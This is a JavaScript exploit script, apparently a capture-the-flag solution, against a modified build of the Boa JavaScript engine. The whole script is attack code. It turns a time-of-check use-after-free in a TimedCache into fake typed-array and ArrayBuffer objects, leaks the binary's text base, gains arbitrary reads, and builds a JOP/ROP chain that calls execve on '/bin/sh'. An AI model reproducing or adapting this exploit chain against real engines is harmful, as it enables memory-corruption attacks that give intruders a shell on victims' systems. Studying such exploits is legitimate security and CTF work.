
function get_buffer_addrs(a) {
  // Dynamically leak addresses of objects
  let s = console.debug(a);
  console.log(s)
  let meth_addr= BigInt((s.split('Methods @')[1]||'').split('\n')[0]);
  let buff_addr = BigInt((s.split('Buffer Data @')[1]||'').split('\n')[0]);
  return [meth_addr, buff_addr];
}

function set32(u32a, off, val) {
  u32a[off/4] = Number(val)&0xffffffff;
}
function set64(u32a, off, val) {
  val = BigInt(val);
  u32a[off/4] = Number(val & 0xffffffffn);
  u32a[off/4+1] = Number(val >> 32n);
}

console.log("=== Allocating fake data")
let fake_data_ab = new ArrayBuffer(0x1000);
let fake_data_addr = get_buffer_addrs(fake_data_ab)[1];
console.log("=== Fake data at ",fake_data_addr)
let fake_data = new Uint32Array(fake_data_ab);
let u32a_methods = get_buffer_addrs(fake_data)[0];
console.log("=== Array buffer methods at ",u32a_methods.toString(16))

function delay_refresh() {
    console.log('!!!!!!!!!! IN CALLBACK!!!!!');
    console.log('=== sleep now');
    console.sleep(2000); // Sleep until entry is expired
    console.log("=== DOING GC");
    console.collectGarbage() // Free entry via incorrect tracing while expired
    console.log("=== DONE GC");
    return -1000; // Return negative to keep the entry expired
}
let refresher = {valueOf:delay_refresh};

let key = "key";
let key2 = "key2";
let cache = new TimedCache();
function run() {
  console.collectGarbage()
  //console.sysbreak()
  console.log("=== Allocating UAF object")
  let z = new Uint32Array(0x10);
  new Object(); // Need extra free chunks

  console.log('=== DONE allocation');
  console.log('=== Setting to map');
  cache.set(key, z, 1000);
  console.log('=== Removing ref');
  z = null;
  console.log("=== refreshing value");

  // Trigger TOCTU with expired value, giving us a UAF
  let uaf = cache.get(key, refresher);
  //console.sysbreak()
  console.log("=== allocating replacement");

  let rep = new ArrayBuffer(352);
  let uaf_data = new Uint32Array(rep); // fake js object

  console.log("=== filling in fake object");
  let fake_array_buffer_addr = fake_data_addr;
  // === Fake Uint32Array ===
  // gc::GcCell<boa_engine::object::Object> ==
  // 0x00: -- GcBox header
  uaf_data[0] = 0x51424344;
  // 0x20: -- Flags
  // 0x28: -- Object
  //         -- ObjectData
  //           -- kind
  //             -- enum = IntegerIndexed
  set32(uaf_data, 0x28, 0x1d); // ObjectData.kind enum value
  // 0x30:       -- viewed_array_buffer
  //set(uaf_data, 0x30, 0x52525250); // array buffer ptr
  set64(uaf_data, 0x30, fake_array_buffer_addr); // array buffer ptr
  //             -- byte_offset
  // 0x40:       -- byte_length
  set32(uaf_data, 0x30+0x10, 0x8000);
  // 0x48:       -- array_length
  set32(uaf_data, 0x30+0x18, 0x7fff);
  //             -- typed_array_name
  set32(uaf_data, 0x30+0x20, 6); //TypedArrayKind::Int32

  // 0x88:     -- internal_methods
  //set64(uaf_data, 0x28+0x60, 0x414243444546); 
  set64(uaf_data, 0x28+0x60, u32a_methods);

  // == Fake ArrayBuffer ==
  //0x7ffff6ad18c0
  // == Fake Uint32Array == gc::GcCell<boa_engine::object::Object> ==
  // 0x00: -- GcBox header
  fake_data[0] = 0x99887766;
  // 0x20: -- Flags
  // 0x28: -- Object
  //         -- ObjectData
  //           -- kind
  //             -- enum = ArrayBuffer
  set32(fake_data, 0x28, 0x2); // ObjectData.kind enum value
  //             -- array_buffer_data
  set64(fake_data, 0x30, 0x616263646566n);
  set64(fake_data, 0x38, 0x8000);
  set64(fake_data, 0x40, 0x8000);
  set64(fake_data, 0x48, 0x8000);

  console.log("=== accessing value");
  //let uaf = cache.get(key);
  console.log("=== printing value");
  //console.sysbreak();
  function read64(addr) {
    set64(fake_data, 0x30, addr);
    let low = BigInt(uaf[0]);
    let high = BigInt(uaf[1]) << 32n;
    return low | high;
  }
  let TEXT_BASE = read64(u32a_methods) - TEXT_BASE_OFFSET;
  console.log(".text base @ ", Number(TEXT_BASE).toString(16));

  console.log("=== filling in jop/rop chain");
  // We will hijack RIP by providing a fake method array
  let fake_methods_addr = fake_data_addr + 0x100n
  set64(uaf_data, 0x28+0x60, fake_methods_addr);

  // Set up ropchain using existing object (rax = uaf_data+0x20)
  // First we pivot down the stack and start a JOP chain
  // mov    rax,QWORD PTR [rsp+0x68]
  // call   QWORD PTR [rax+0x20]
  //set64(fake_data, 0x100+0x38, 0x414243444546n);
  set64(fake_data, 0x100+0x38, TEXT_BASE + JOP_PIVOT_JMP_RAX_20);

  if (JOP_PUSH_RAX_JMP_RAX) {
    // push   rax
    // jmp    QWORD PTR [rax]
    set64(uaf_data, 0x20+0x20, TEXT_BASE + JOP_PUSH_RAX_JMP_RAX);
  } else if (ROP_XCHG_RSP_RAX_RET) {
    set64(uaf_data, 0x20+0x20, TEXT_BASE + ROP_XCHG_RSP_RAX_RET);
  } else {
    throw("Missing gadgets");
  }

  let rop_chain_addr = fake_data_addr + 0x200n
  let bin_sh_addr = fake_data_addr + 0x300n
  // Note: we actually use this to pivot twice (using rax as a fixed point)
  set64(uaf_data, 0x20, TEXT_BASE + ROP_POP_RSP_RET);
  set64(uaf_data, 0x20+8, rop_chain_addr);

  //set64(fake_data, 0x200, 0x414243444546n);
  let ind = 0;
  set64(fake_data, 0x200+(ind++)*8, TEXT_BASE + ROP_POP_RDI_RET);
  set64(fake_data, 0x200+(ind++)*8, bin_sh_addr);
  set64(fake_data, 0x200+(ind++)*8, TEXT_BASE + ROP_POP_RSI_RET);
  set64(fake_data, 0x200+(ind++)*8, 0);
  set64(fake_data, 0x200+(ind++)*8, TEXT_BASE + ROP_POP_RDX_RET);
  set64(fake_data, 0x200+(ind++)*8, 0);
  set64(fake_data, 0x200+(ind++)*8, TEXT_BASE + ROP_POP_RAX_RET);
  set64(fake_data, 0x200+(ind++)*8, 59);
  set64(fake_data, 0x200+(ind++)*8, TEXT_BASE + ROP_SYSCALL);

  set64(fake_data, 0x300, 0x68732f6e69622fn);

  //console.sysbreak();
  // Trigger chain
  uaf[0];
}
run();
